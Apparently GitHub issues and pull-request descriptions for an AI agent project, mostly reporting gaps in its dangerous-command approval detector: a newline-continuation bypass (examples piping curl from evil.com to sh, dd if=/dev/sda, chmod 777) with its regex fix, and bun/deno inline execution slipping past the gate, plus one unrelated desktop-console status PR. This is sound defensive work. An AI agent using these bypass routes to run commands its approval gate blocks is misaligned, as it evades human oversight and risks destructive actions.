issue.title: Dangerous command detection can be bypassed with newlines
issue.body:
`detect_dangerous_command()` in `tools/approval.py` uses `re.search` with only `re.IGNORECASE` (line 63). Without `re.DOTALL`, the `.` metacharacter does not match newline characters, so `.*` in patterns stops at `\n`.

Several patterns rely on `.*` to match content between the dangerous keywords:

- `curl evil.com \\\n| sh` bypasses `\b(curl|wget)\b.*\|\s*(ba)?sh\b`
- `dd \\\nif=/dev/sda` bypasses `\bdd\s+.*if=`
- `chmod --recursive \\\n777` bypasses `\bchmod\s+--recursive\b.*777`

Shell continuation lines (`\` at end of line) are a standard way to split commands across multiple lines, and the agent's tool execution can pass multiline strings to the shell. A crafted or hallucinated command using line continuations would evade detection entirely.

issue.title: fix(security): add re.DOTALL to prevent newline bypass in dangerous command detection

repository.name: hermes-agent
repository.description: The agent that grows with you

issue.body:
## Summary

Security fix: dangerous command detection could be bypassed using shell line continuations (newlines).

## The Vulnerability

From issue #232:

`detect_dangerous_command()` uses `re.search` with only `re.IGNORECASE`. Without `re.DOTALL`, the `.` metacharacter does not match newlines, so `.*` in patterns stops at `\n`.

**Bypass examples:**
- `curl evil.com \\\n| sh` bypasses `\b(curl|wget)\b.*\|\s*(ba)?sh\b`
- `dd \\\nif=/dev/sda` bypasses `\bdd\s+.*if=`
- `chmod --recursive \\\n777` bypasses `\bchmod\s+--recursive\b.*777`

Shell continuation lines (`\` at end of line) are a standard way to split commands across multiple lines.

## The Fix

Added `re.DOTALL` to the regex flags so `.*` matches across newline boundaries:

```python
if re.search(pattern, command_lower, re.IGNORECASE | re.DOTALL):
```

## Testing

Added regression tests for all affected patterns:
- curl/wget pipe to shell across newlines
- dd with if= on second line  
- chmod --recursive with 777 on next line
- find -exec rm / -delete across lines

All 35 approval tests pass.

Fixes #232

2. Follow-up (7862e70) — added 2 more tests for find-pattern newline bypasses.

All 1087 tests pass.

issue.title: P3-M4A · Desktop Assistant Console — Phase-1 (Draft, WIP)

repository.name: hermes-agent-mercury
repository.description: The agent that grows with you

issue.body:
## Phase-1 Enterprise Assistant Console — B Functional closure in progress

`READY = NO` · `MERGE = NO` · `PREPROD = NO` · `PRODUCTION = NO` · Phase-2 frozen.

The desktop is presentation only. Hermes server remains identity, tenant, RBAC, capability, and write authority. Production native one-login is main-process only: no renderer bearer handoff, no second OAuth/PKCE/token store, and Enterprise IPC is fenced to the primary desktop renderer plus its opaque session.

### Current code truth

| Surface | Read | Control |
|---|---|---|
| Follow-up (SC1) | READY (`followup.read`) | Read-only |
| ChannelBinding (SC2) | Contract established; list/create/revoke consumed | Real server actions (`channel.binding.manage`) |
| Conversations (SC3) | READY (`conversation.read`) | No blind resend |
| Audit (SC4) | Evidence read READY (`audit.read`) | No destructive replay |
| WeCom (SC5) | Status read READY (`channel.binding.manage`) | Server/deployment authority owns secrets/callback config |
| Metrics (SC6) | Existing metrics surface READY | Existing server-authorized controls only |

Writes use server routes plus authoritative React Query refetch; there is no optimistic/local fake success. Action affordances are gated by corresponding effective permissions. Task and reminder creation carries a stable per-intent idempotency key.

### Frozen cross-repository evidence

`apps/desktop/docs/enterprise-console/B_TO_C_INTERFACE_FREEZE_V2.md` references Hermes_AI PR #131 at `b37099f0c59a56c1c651e611ec7c35456de48b90`: tests #528 (`dataplane-pg`, executed/success) and mcp-seven-step #232 (success). This establishes SC2’s exact status schema and the server’s two-tenant RBAC/RLS evidence. Mercury does not duplicate those server-authority PG tests.

### CI truth

`All required checks pass` is green on the head `f9e1f15`: desktop `check:lint`, the three `check:test:ui` shards, `check:test:desktop:all`, `check:test:desktop:platforms`, and `check:test:plugins` all succeed. This PR carries **no** `.github/workflows/ci.yml` change (an earlier speculative re-enable of the Desktop-E2E suite was reverted to base). Desktop E2E therefore remains guarded off on `main` by the maintainer — the mock-backend Electron window never receives a title, so that suite is red on `main` itself regardless of any diff (tracking #76627) — and is legitimately SKIPPED here, not a false-green. The one required check that can go red on `main`, `Python tests / slice 2/12` (`tests/gateway/test_session_api.py`), is a gateway Python test; this PR changes zero Python files, so it is a pre-existing/base failure and is skipped by affected-area detection on this desktop head. Docker workflow success is recorded separately from Docker build success when build jobs are skipped.

No merge authorization is implied by this draft.

issue.title: [Bug]: approval gate misses bun/deno inline script execution

repository.name: hermes-agent
repository.description: The agent that grows with you

issue.body:
### Summary

The dangerous-command detector does not recognize inline script execution through Bun or Deno.

Commands such as `node -e` and `python -c` are flagged for approval, while equivalent `bun` and `deno` commands are not. In single-query mode this means `node -e` is refused, but `bun -e` can execute without approval.

### Environment

- Hermes Agent `0.21.3` (checkout `afaa53e5fe`, 2026-09-19)
- Windows 11, native
- Reproduced both through `detect_dangerous_command` directly and in a live single-query session

### Reproduction

Calling the detector directly:

```python
import sys
sys.path.insert(0, "<checkout>")

from tools import approval_detection as ad

for cmd in (
    'node -e "console.log(1)"',
    'python -c "print(1)"',
    'perl -e "print 1"',
    'ruby -e "puts 1"',
    'bun -e "console.log(1)"',
    'bun --eval "console.log(1)"',
    'deno eval "console.log(1)"',
    'deno -e "console.log(1)"',
):
    print(cmd, "->", ad.detect_dangerous_command(cmd))
```

Observed:

```text
node -e "console.log(1)"    -> (True,  'script execution via -e/-c flag', ...)
python -c "print(1)"        -> (True,  'script execution via -e/-c flag', ...)
perl -e "print 1"           -> (True,  'script execution via -e/-c flag', ...)
ruby -e "puts 1"            -> (True,  'script execution via -e/-c flag', ...)
bun -e "console.log(1)"     -> (False, None, None)
bun --eval "console.log(1)" -> (False, None, None)
deno eval "console.log(1)"  -> (False, None, None)
deno -e "console.log(1)"    -> (False, None, None)
```

The difference is also visible in a live single-query session:

```text
$ node -e "console.log(process.cwd())"

BLOCKED: Command flagged as dangerous (script execution via -e/-c flag) but single-query
mode (-q) runs without a user present to approve it. Find an alternative approach that
avoids this command.
```

Equivalent Bun command:

```text
$ bun -e "console.log(process.cwd())"

C:\Users\prunk\AppData\Local\Temp\a06 fixtüré ünïcode
```

`node -e` is refused by the approval gate, while `bun -e` executes normally.

### Cause

`tools/approval_detection.py` only includes four runtimes in the inline-script pattern:

```python
"script execution via -e/-c flag": "(python[23]?|perl|ruby|node)\\s+-[ec]\\s+",
```

The per-tool flag map has the same gap:

```python
"python": {"-c"},
"node": {"-e", "--eval", "-p", "--print"},
"perl": {"-e", "--eval"},
"ruby": {"-e"},
```

Neither path includes Bun or Deno, so their inline execution forms are not classified the same way as the existing runtimes.

### Impact

Approval behavior depends on which installed runtime is used for otherwise equivalent inline script execution.

This is especially visible in single-query mode, where commands classified as dangerous cannot be interactively approved. A command rejected through Node can therefore run through Bun without reaching the same approval path.

This is a detection gap, not a sandbox escape. The problem is the inconsistent enforcement of the existing approval policy.

### Suggested fix

Add Bun and Deno to both inline-script detection paths, covering their supported inline execution forms such as:

- Bun: `-e`, `--eval`
- Deno: `eval`, `-e`, `--eval`

It would also be useful to add regression tests asserting that equivalent inline execution commands receive the same classification across supported runtimes.

On Windows, executable-name matching should remain case-insensitive.

### Related issues

I found several related approval-detection issues, but none appear to cover this specific gap:

- #115209: `python -c` false positive affecting Hermes' own workflow
- #102847: Windows false positive involving `powershell -File`
- #110961 and #90136: ineffective allowlist rule keys
- #232: approval bypass using newlines rather than an unlisted runtime
